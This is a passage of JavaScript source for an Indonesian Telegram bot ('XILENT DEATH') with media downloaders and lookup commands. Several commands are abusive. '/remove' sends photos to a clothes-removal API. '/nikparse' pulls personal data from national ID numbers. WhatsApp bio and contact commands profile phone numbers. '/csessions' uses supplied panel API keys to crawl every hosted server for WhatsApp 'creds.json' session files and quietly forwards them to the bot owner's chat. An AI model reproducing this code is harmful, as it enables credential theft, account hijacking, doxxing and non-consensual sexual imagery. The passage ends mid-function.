        return ctx.reply(`❌ ☇ Kategori tidak valid. Kategori yang tersedia: ${validCategories.slice(0, 10).join(', ')}...`);
    }

    try {
        const response = await axios.get(`https://api.waifu.pics/sfw/${category}`);
        
        await ctx.replyWithVideo(response.data.url, {
            caption: `<blockquote><b>⬡═―—⊱ ⎧ WAIFU IMAGE ⎭ ⊰―—═⬡</b></blockquote>🌸 Kategori: ${category}`,
            parse_mode: "HTML"
        });
    } catch (error) {
        await ctx.reply("❌ ☇ Gagal mengambil gambar waifu");
    }
});

bot.command("anime", checkPremium, async (ctx) => {
    const query = ctx.message.text.split(" ").slice(1).join(" ");
    if (!query) return ctx.reply("👀 ☇ Format: /anime <judul anime>");

    const waitMsg = await ctx.reply("⏳ ☇ Mencari anime...");

    try {
        const response = await axios.get(`https://api.jikan.moe/v4/anime?q=${encodeURIComponent(query)}&limit=5`);
        
        if (!response.data.data || response.data.data.length === 0) {
            await ctx.reply("❌ ☇ Anime tidak ditemukan");
            return;
        }

        const anime = response.data.data[0];
        const caption = `
<blockquote><b>⬡═―—⊱ ⎧ ANIME INFO ⎭ ⊰―—═⬡</b></blockquote>
🎬 <b>${anime.title}</b>
${anime.title_japanese ? `📝 ${anime.title_japanese}\n` : ''}
⭐ Rating: ${anime.score || 'N/A'}
📊 Status: ${anime.status}
📅 Episode: ${anime.episodes || 'Ongoing'}
🎭 Type: ${anime.type}
📺 Source: ${anime.source}

📖 <b>Sinopsis:</b>
${anime.synopsis ? anime.synopsis.substring(0, 500) + '...' : 'Tidak tersedia'}

🔗 <a href="${anime.url}">MyAnimeList</a>`;

        await ctx.replyWithVideo(anime.images.jpg.large_image_url, {
            caption: caption,
            parse_mode: "HTML",
            disable_web_page_preview: true
        });

    } catch (error) {
        await ctx.reply("❌ ☇ Gagal mencari anime");
    } finally {
        try { await ctx.deleteMessage(waitMsg.message_id); } catch {}
    }
});


bot.command("cekbiotele", async (ctx) => {
    const args = ctx.message.text.split(" ").slice(1);
    
    if (args.length < 1 && !ctx.message.reply_to_message) {
        return ctx.reply("📝 Format: /cekbio <username|user_id|reply>\nContoh: /cekbio @username\n/cekbio 123456789\n/cekbio [reply user]");
    }

    let targetUser;
    const processMsg = await ctx.reply("⏳ Mengambil informasi bio...");

    try {
        // Determine target user
        if (ctx.message.reply_to_message) {
            targetUser = ctx.message.reply_to_message.from;
        } else if (args[0].startsWith('@')) {
            const username = args[0].slice(1);
            targetUser = await ctx.telegram.getChat(`@${ctx.from.first_name}`);
        } else {
            const userId = parseInt(args[0]);
            if (isNaN(userId)) {
                await ctx.editMessageText("❌ User ID atau username tidak valid", {
                    chat_id: ctx.chat.id,
                    message_id: processMsg.message_id
                });
                return;
            }
            targetUser = await ctx.telegram.getChat(userId);
        }

        // Get user profile photos for avatar
        const profilePhotos = await ctx.telegram.getUserProfilePhotos(targetUser.id, 0, 1);
        
        // Get full user info
        const userInfo = await formatUserBio(targetUser, profilePhotos);

        // Send result
        if (profilePhotos.total_count > 0) {
            const photoFile = await ctx.telegram.getFile(profilePhotos.photos[0][0].file_id);
            const thumbnailUrl = `https://api.telegram.org/file/bot${ctx.telegram.token}/${photoFile.file_path}`;
            
            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: userInfo,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📊 Info Lengkap", callback_data: `fullinfo_${targetUser.id}` }],
                        [{ text: "🔄 Scan Ulang", callback_data: `rescan_bio_${targetUser.id}` }]
                    ]
                }
            });
        } else {
            await ctx.reply(userInfo, {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📊 Info Lengkap", callback_data: `fullinfo_${targetUser.id}` }]
                    ]
                }
            });
        }

        await ctx.deleteMessage(processMsg.message_id);

    } catch (error) {
        console.error("Bio check error:", error);
        await ctx.editMessageText("❌ Gagal mengambil informasi user. Pastikan username/userID valid dan user tidak di-private.", {
            chat_id: ctx.chat.id,
            message_id: processMsg.message_id
        });
    }
});

bot.command("cekbio", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("👀 ☇ Format: /cekbio 62×××");
    }

    const q = args[1];
    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    const processMsg = await ctx.replyWithPhoto(thumbnailUrl, {
        caption: `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: Checking...
⌑ Type: WhatsApp Bio Check`,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [
                [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
            ]
        }
    });

    try {
        // Menggunakan Baileys untuk mendapatkan info kontak
        const contact = await sock.onWhatsApp(target);
        
        if (!contact || contact.length === 0) {
            await ctx.telegram.editMessageCaption(
                ctx.chat.id,
                processMsg.message_id,
                undefined,
                `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: ❌ Not Found
⌑ Message: Nomor tidak terdaftar di WhatsApp`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
                        ]
                    }
                }
            );
            return;
        }

        // Mendapatkan detail kontak
        const contactDetails = await sock.fetchStatus(target).catch(() => null);
        const profilePicture = await sock.profilePictureUrl(target, 'image').catch(() => null);
        
        const bio = contactDetails?.status || "Tidak ada bio";
        const lastSeen = contactDetails?.lastSeen ? 
            moment(contactDetails.lastSeen).tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss') : 
            "Tidak tersedia";

        const caption = `
<blockquote><b>⬡═―—⊱ ⎧ BIO INFORMATION ⎭ ⊰―—═⬡</b></blockquote>
📱 <b>Nomor:</b> ${q}
👤 <b>Status WhatsApp:</b> ✅ Terdaftar
📝 <b>Bio:</b> ${bio}
👀 <b>Terakhir Dilihat:</b> ${lastSeen}
${profilePicture ? '🖼 <b>Profile Picture:</b> ✅ Tersedia' : '🖼 <b>Profile Picture:</b> ❌ Tidak tersedia'}

🕐 <b>Diperiksa pada: ${moment().tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss')}</b>`;

        // Jika ada profile picture, kirim bersama foto profil
        if (profilePicture) {
            await ctx.replyWithPhoto(profilePicture, {
                caption: caption,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}` }]
                       
                    ]
                }
            });
        } else {
            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: caption,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}` }]
                      
                    ]
                }
            });
        }

        // Hapus pesan proses
        await ctx.deleteMessage(processMsg.message_id);

    } catch (error) {
        console.error("Error checking bio:", error);
        
        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMsg.message_id,
            undefined,
            `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: ❌ Error
⌑ Message: Gagal mengambil data bio`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
                    ]
                }
            }
        );
    }
});

bot.command("cekkontak", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("👀 ☇ Format: /cekkontak 62×××\nContoh: /cekkontak 628123456789");
    }

    const number = args[1];
    const cleanNumber = number.replace(/[^0-9]/g, '');
    const target = cleanNumber + "@s.whatsapp.net";

    const processMsg = await ctx.reply("⏳ ☇ Memeriksa kontak WhatsApp...");

    try {
        // Cek apakah nomor terdaftar di WhatsApp
        const contactCheck = await sock.onWhatsApp(target);
        
        if (!contactCheck || contactCheck.length === 0) {
            await ctx.editMessageText(
                `❌ ☇ Nomor ${number} tidak terdaftar di WhatsApp`,
                { chat_id: ctx.chat.id, message_id: processMsg.message_id }
            );
            return;
        }

        const contact = contactCheck[0];
        
        // Dapatkan info profil lengkap
        let profilePicture = null;
        let status = null;
        let businessProfile = null;

        try {
            profilePicture = await sock.profilePictureUrl(target, 'image').catch(() => null);
        } catch (e) {}

        try {
            status = await sock.fetchStatus(target).catch(() => null);
        } catch (e) {}

        try {
            businessProfile = await sock.getBusinessProfile(target).catch(() => null);
        } catch (e) {}

        // Format hasil
        let contactInfo = `<blockquote><b>⬡═―—⊱ ⎧ WHATSAPP CONTACT INFO ⎭ ⊰―—═⬡</b></blockquote>\n\n`;
        
        contactInfo += `📱 <b>Informasi Kontak</b>\n\n`;
        contactInfo += `🔢 <b>Nomor:</b> +${cleanNumber}\n`;
        contactInfo += `✅ <b>Status WhatsApp:</b> Terdaftar\n`;
        
        if (contact.exists) {
            contactInfo += `🟢 <b>Akun Aktif:</b> Ya\n`;
        }

        if (status) {
            contactInfo += `📝 <b>Status/Bio:</b> ${status.status || 'Tidak ada'}\n`;
            if (status.setAt) {
                contactInfo += `⏰ <b>Status Diubah:</b> ${new Date(status.setAt).toLocaleString('id-ID')}\n`;
            }
        }

        if (businessProfile) {
            contactInfo += `🏢 <b>Akun Bisnis:</b> Ya\n`;
            contactInfo += `📊 <b>Kategori:</b> ${businessProfile.categories?.[0]?.name || 'Tidak diketahui'}\n`;
            contactInfo += `📋 <b>Deskripsi:</b> ${businessProfile.description || 'Tidak ada'}\n`;
            
            if (businessProfile.email) {
                contactInfo += `📧 <b>Email:</b> ${businessProfile.email}\n`;
            }
            if (businessProfile.website) {
                contactInfo += `🌐 <b>Website:</b> ${businessProfile.website}\n`;
            }
            if (businessProfile.address) {
                contactInfo += `📍 <b>Alamat:</b> ${businessProfile.address}\n`;
            }
        }

        contactInfo += `\n🖼 <b>Foto Profil:</b> ${profilePicture ? 'Tersedia' : 'Tidak tersedia'}\n`;
        contactInfo += `📞 <b>Chat:</b> <a href="https://wa.me/${cleanNumber}">Klik di sini</a>\n`;

        // Kirim hasil
        if (profilePicture) {
            await ctx.replyWithPhoto(profilePicture, {
                caption: contactInfo,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📞 Chat WhatsApp", url: `https://wa.me/${cleanNumber}` }],
                        [{ text: "💬 Cek Grup", callback_data: `checkgroups_${cleanNumber}` }]
                    ]
                }
            });
        } else {
            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: contactInfo,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📞 Chat WhatsApp", url: `https://wa.me/${cleanNumber}` }],
                        [{ text: "📊 Cek Detail", callback_data: `checkdetail_${cleanNumber}` }]
                    ]
                }
            });
        }

        await ctx.deleteMessage(processMsg.message_id);

    } catch (error) {
        console.error("Error checking contact:", error);
        await ctx.editMessageText(
            `❌ ☇ Gagal memeriksa kontak ${number}\nError: ${error.message}`,
            { chat_id: ctx.chat.id, message_id: processMsg.message_id }
        );
    }
});

bot.command("remove", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1).join(' ')
  let imageUrl = args || null

  if (!imageUrl && ctx.message.reply_to_message && ctx.message.reply_to_message.photo) {
    const fileId = ctx.message.reply_to_message.photo.pop().file_id
    const fileLink = await ctx.telegram.getFileLink(fileId)
    imageUrl = fileLink.href
  }

  if (!imageUrl) {
    return ctx.reply('🪧 ☇ Format: /tonaked (reply gambar)')
  }

  const statusMsg = await ctx.reply('⏳ ☇ Memproses gambar')

  try {
    const res = await fetch(`https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`)
    const data = await res.json()
    const hasil = data.result

    if (!hasil) {
      return ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, '❌ ☇ Gagal memproses gambar, pastikan URL atau foto valid')
    }

    await ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id)
    await ctx.replyWithPhoto(hasil)

  } catch (e) {
    await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, '❌ ☇ Terjadi kesalahan saat memproses gambar')
  }
});

bot.command('mediafire', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    if (!args.length) return ctx.reply('Gunakan: /mediafire <url>');

    try {
      const { data } = await axios.get(`https://www.velyn.biz.id/api/downloader/mediafire?url=${encodeURIComponent(args[0])}`);
      const { title, url } = data.data;

      const filePath = `/tmp/${title}`;
      const response = await axios.get(url, { responseType: 'arraybuffer' });
      fs.writeFileSync(filePath, response.data);

      const zip = new AdmZip();
      zip.addLocalFile(filePath);
      const zipPath = filePath + '.zip';
      zip.writeZip(zipPath);

      await ctx.replyWithDocument({ source: zipPath }, {
        filename: path.basename(zipPath),
        caption: '📦 File berhasil di-zip dari MediaFire'
      });

      
      fs.unlinkSync(filePath);
      fs.unlinkSync(zipPath);

    } catch (err) {
      console.error('[MEDIAFIRE ERROR]', err);
      ctx.reply('Terjadi kesalahan saat membuat ZIP.');
    }
  });
  
bot.command("trackip", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").filter(Boolean);
  if (!args[1]) return ctx.reply("🪧 ☇ Format: /trackip 8.8.8.8");

  const ip = args[1].trim();

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(p => {
      if (!/^\d{1,3}$/.test(p)) return false;
      if (p.length > 1 && p.startsWith("0")) return false; // hindari "01"
      const n = Number(p);
      return n >= 0 && n <= 255;
    });
  }

  function isValidIPv6(ip) {
    const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
    return ipv6Regex.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return ctx.reply("❌ ☇ IP tidak valid masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar");
  }

  let processingMsg = null;
  try {
  processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`, {
    parse_mode: "HTML"
  });
} catch (e) {
    processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`);
  }

  try {
    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 10000 });
    const data = res.data;

    if (!data || data.success === false) {
      return await ctx.reply(`❌ ☇ Gagal mendapatkan data untuk IP: ${ip}`);
    }

    const lat = data.latitude || "";
    const lon = data.longitude || "";
    const mapsUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + ',' + lon)}` : null;

    const caption = `
<blockquote><b> ⬡═―—⊱ ⎧ XILENT DEATH ⎭ ⊰―—═⬡ </b></blockquote>
𖤓 IP: ${data.ip || "-"}
𖤓 Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
𖤓 Region: ${data.region || "-"}
𖤓 City: ${data.city || "-"}
𖤓 ZIP: ${data.postal || "-"}
𖤓 Timezone: ${data.timezone_gmt || "-"}
𖤓 ISP: ${data.isp || "-"}
𖤓 Org: ${data.org || "-"}
𖤓 ASN: ${data.asn || "-"}
𖤓 Lat/Lon: ${lat || "-"}, ${lon || "-"}
`.trim();

    const inlineKeyboard = mapsUrl ? {
      reply_markup: {
        inline_keyboard: [
          [{ text: "⌜🌍⌟ ☇ オープンロケーション", url: mapsUrl }]
        ]
      }
    } : null;

    try {
      if (processingMsg && processingMsg.photo && typeof processingMsg.message_id !== "undefined") {
        await ctx.telegram.editMessageCaption(
          processingMsg.chat.id,
          processingMsg.message_id,
          undefined,
          caption,
          { parse_mode: "HTML", ...(inlineKeyboard ? inlineKeyboard : {}) }
        );
      } else if (typeof thumbnailUrl !== "undefined" && thumbnailUrl) {
        await ctx.replyWithPhoto(thumbnailUrl, {
          caption,
          parse_mode: "HTML",
          ...(inlineKeyboard ? inlineKeyboard : {})
        });
      } else {
        if (inlineKeyboard) {
          await ctx.reply(caption, { parse_mode: "HTML", ...inlineKeyboard });
        } else {
          await ctx.reply(caption, { parse_mode: "HTML" });
        }
      }
    } catch (e) {
      if (mapsUrl) {
        await ctx.reply(caption + `📍 ☇ Maps: ${mapsUrl}`, { parse_mode: "HTML" });
      } else {
        await ctx.reply(caption, { parse_mode: "HTML" });
      }
    }

  } catch (err) {
    await ctx.reply("❌ ☇ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti");
  }
});

// Command /cekid
bot.command("cekid", async (ctx) => {
    const chatId = ctx.chat.id;
    
    try {
        // Ambil teks setelah command
        const text = ctx.message.text.split(" ").slice(1).join(" ");
        
        if (!text) {
            return ctx.reply("⚠ Gunakan: /cekid https://whatsapp.com/channel/xxxx");
        }

        if (!text.includes("whatsapp.com/channel/")) {
            return ctx.reply("❌ Link WhatsApp Channel tidak valid!");
        }

        let channelId = text.split("channel/")[1].split(/[/?]/)[0];
        let newsletterJid = channelId + "@newsletter";

        await ctx.reply(
`✅ Newsletter ID ditemukan:

${newsletterJid}`
        );

    } catch (err) {
        console.log(err);
        ctx.reply("Terjadi error saat proses.");
    }
});

bot.command("tiktok", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("🪧 Format: /tiktok https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  // Validasi URL TikTok
  if (!url.match(/(tiktok\.com|vt\.tiktok\.com)/)) {
    return ctx.reply("❌ Link TikTok tidak valid!");
  }

  // Kirim pesan dengan button
  await ctx.reply(
    "📥 Pilih jenis download yang diinginkan:",
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🎬 Video + Audio", callback_data: `tiktok_download|${url}|video` },
            { text: "🌟 HD (No Watermark)", callback_data: `tiktok_download|${url}|hd` }
          ],
          [
            { text: "🎵 Audio Saja", callback_data: `tiktok_download|${url}|audio` }
          ]
        ]
      }
    }
  );
});


// Fungsi download TikTok dengan berbagai tipe
async function downloadTikTok(url, type = 'video') {
  try {
    // Step 1: Ambil data video dari API
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent": "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data) {
      return { success: false, error: "Gagal ambil data video" };
    }

    const videoData = data.data;
    
    // Step 2: Pilih URL berdasarkan tipe
    let downloadUrl;
    
    if (type === 'audio') {
      // Ambil audio saja
      downloadUrl = videoData.music || videoData.music_info?.play_url;
      if (!downloadUrl) {
        return { success: false, error: "Audio tidak tersedia" };
      }
    } else if (type === 'hd') {
      // Prioritaskan video tanpa watermark (HD)
      downloadUrl = videoData.play || videoData.hdplay;
    } else {
      // Video standar (biasanya dengan watermark)
      downloadUrl = videoData.play || videoData.wmplay || videoData.hdplay;
    }

    if (!downloadUrl) {
      return { success: false, error: "URL download tidak ditemukan" };
    }
    const response = await axios.get(downloadUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent": "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    if (type === 'audio' && !downloadUrl.includes('.mp3')) {
    }

    return { 
      success: true, 
      data: response.data,
      type: type,
      size: response.data.length
    };

  } catch (error) {
    console.error("Download error:", error);
    return { 
      success: false, 
      error: error.response?.status 
        ? `Error ${error.response.status}`
        : "Koneksi timeout atau link salah"
    };
  }
}

// Helper function untuk nama tipe
function getTypeName(type) {
  const names = {
    'video': 'Video + Audio',
    'hd': 'HD No Watermark',
    'audio': 'Audio Saja'
  };
  return names[type] || type;
}

async function downloadFromAlternateAPI(url, type) {
  const apis = [
    "https://api.tikmate.app/api/lookup",
    "https://www.tikwm.com/api/"
  ];
  
  for (const api of apis) {
    try {
    } catch (error) {
      continue;
    }
  }
  
  throw new Error("Semua API gagal");
}

bot.command("igdl", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("🪧 Format: /igdl https://www.instagram.com/p/Cxample123/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ ☇ Sedang memproses video Instagram");

  try {
    // Alternative API - Instagram Downloader
    const { data } = await axios.get("https://api.igdownloader.com/api/ig", {
      params: { url },
      headers: {
        "user-agent": "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*"
      },
      timeout: 20000
    });

    if (!data || data.error) {
      return ctx.reply("❌ ☇ Gagal ambil data video pastikan link valid dan publik");
    }

    const mediaUrl = data.result?.url || data.result;
    
    if (!mediaUrl) {
      return ctx.reply("❌ ☇ Tidak ada media yang bisa diunduh");
    }

    // Download media
    const media = await axios.get(mediaUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent": "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    // Cek tipe media dari Content-Type
    const contentType = media.headers['content-type'];
    const isVideo = contentType && contentType.startsWith('video');

    if (isVideo) {
      await ctx.replyWithVideo(
        { source: Buffer.from(media.data), filename: `ig_${Date.now()}.mp4` },
        { 
          supports_streaming: true,
          caption: "✅ Video Instagram berhasil didownload"
        }
      );
    } else {
      await ctx.replyWithPhoto(
        { source: Buffer.from(media.data) },
        { caption: "📷 Foto Instagram berhasil didownload" }
      );
    }

  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ ☇ Error ${e.response.status} saat mengunduh media`
        : "❌ ☇ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

bot.command("nikparse", checkPremium, async (ctx) => {
  const nik = ctx.message.text.split(" ").slice(1).join("").trim();
  if (!nik) return ctx.reply("🪧 Format: /nikparse 1234567890283625");
  if (!/^\d{16}$/.test(nik)) return ctx.reply("❌ ☇ NIK harus 16 digit angka");

  const wait = await ctx.reply("⏳ ☇ Sedang memproses pengecekan NIK");

const replyHTML = (d) => {
  const get = (x) => (x ?? "-");

  const caption =`
<blockquote><b> ⬡═―—⊱ ⎧ XILENT DEATH ⎭ ⊰―—═⬡ </b></blockquote>
𖤓 NIK: ${get(d.nik) || nik}
𖤓 Nama: ${get(d.nama)}
𖤓 Jenis Kelamin: ${get(d.jenis_kelamin || d.gender)}
𖤓 Tempat Lahir: ${get(d.tempat_lahir || d.tempat)}
𖤓 Tanggal Lahir: ${get(d.tanggal_lahir || d.tgl_lahir)}
𖤓 Umur: ${get(d.umur)}
𖤓 Provinsi: ${get(d.provinsi || d.province)}
𖤓 Kabupaten/Kota: ${get(d.kabupaten || d.kota || d.regency)}
𖤓 Kecamatan: ${get(d.kecamatan || d.district)}
𖤓 Kelurahan/Desa: ${get(d.kelurahan || d.village)}
`;

  return ctx.reply(caption, { parse_mode: "HTML", disable_web_page_preview: true });
};

  try {
    const a1 = await axios.get(
      `https://api.akuari.my.id/national/nik?nik=${nik}`,
      { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
    );

    if (a1?.data?.status && a1?.data?.result) {
      await replyHTML(a1.data.result);
    } else {
      const a2 = await axios.get(
        `https://api.nikparser.com/nik/${nik}`,
        { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
      );
      if (a2?.data) {
        await replyHTML(a2.data);
      } else {
        await ctx.reply("❌ ☇ NIK tidak ditemukan");
      }
    }
  } catch (e) {
    try {
      const a2 = await axios.get(
        `https://api.nikparser.com/nik/${nik}`,
        { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
      );
      if (a2?.data) {
        await replyHTML(a2.data);
      } else {
        await ctx.reply("❌ ☇ Gagal menghubungi api, Coba lagi nanti");
      }
    } catch {
      await ctx.reply("❌ ☇ Gagal menghubungi api, Coba lagi nanti");
    }
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});



bot.command("csessions", checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("🪧 ☇ Format: /csessions https://domainpanel.com,ptla_123,ptlc_123");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("🪧 ☇ Format: /csessions https://panelku.com,plta_123,pltc_123");

  await ctx.reply(
    "⏳ ☇ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      }).catch(() => ({ data: null }));
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      ).catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "creds.json") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "creds.json") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("❌ ☇ Tidak ada server yang bisa discan");
    }

    let totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `📁 ☇ Ditemukan creds.json di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_creds.json`,
              });
            } else {
              await ctx.reply(
                `❌ ☇ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
            await ctx.reply(
              `❌ ☇ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

